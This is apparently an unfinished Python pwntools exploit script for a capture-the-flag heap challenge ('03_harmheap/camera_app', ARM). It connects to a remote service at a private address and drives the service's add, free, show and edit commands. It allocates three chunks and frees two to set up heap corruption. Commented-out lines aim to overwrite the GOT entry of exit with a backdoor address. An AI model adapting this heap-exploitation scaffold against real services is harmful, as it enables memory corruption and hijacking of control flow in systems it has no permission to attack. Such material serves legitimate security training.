import pwn
import pwnlib.util.packing
import code


def p32(x): return pwnlib.util.packing.pack(x, 32, sign=False)
def p64(x): return pwnlib.util.packing.pack(x, 64, sign=False)


pwn.context(arch='arm', log_level='DEBUG')

binary = pwn.ELF('./crackme/03_harmheap/camera_app')

# got_exit = binary.got['exit']
# addr_backdoor = binary.sym['backdoor']

# DDL_CONTENT = 0x5d8
DDL_SIZE = 0x100


conn = pwn.remote('10.15.201.97', 10002)


def add_ddl_conn(size: int = DDL_SIZE, name: str = '', content: str = ''):
    conn.sendlineafter('Your choice:', '1')
    conn.sendlineafter('DDL size:', str(size))
    conn.sendlineafter('DDL name:', name)
    conn.sendlineafter('DDL content:', content)


def finish_ddl_conn(index: int):
    conn.sendlineafter('Your choice:', '2')
    conn.sendlineafter('Target DDL index:', str(index))


def show_ddl_conn(index: int):
    conn.sendlineafter('Your choice:', '3')
    conn.sendlineafter('Target DDL index:', str(index))


def edit_ddl_conn(index: int, size: int = 0, content: str = 'content'):
    conn.sendlineafter('Your choice:', '4')
    conn.sendlineafter('Target DDL index:', str(index))
    conn.sendlineafter('The size for editting:', str(size))
    conn.sendlineafter('New content:', content)


def exit_conn():
    conn.sendlineafter('Your choice:', '5')


conn.sendlineafter('[Init] main, entering wait.', '0')  # invalid choice to enter input mode

# conn.interactive()

add_ddl_conn(1, 'aaaa', 'aaaa')  # A
add_ddl_conn()  # B
add_ddl_conn()  # C


finish_ddl_conn(1)
finish_ddl_conn(2)


# edit_ddl_conn(2, p64(got_exit))

# code.interact(local=locals())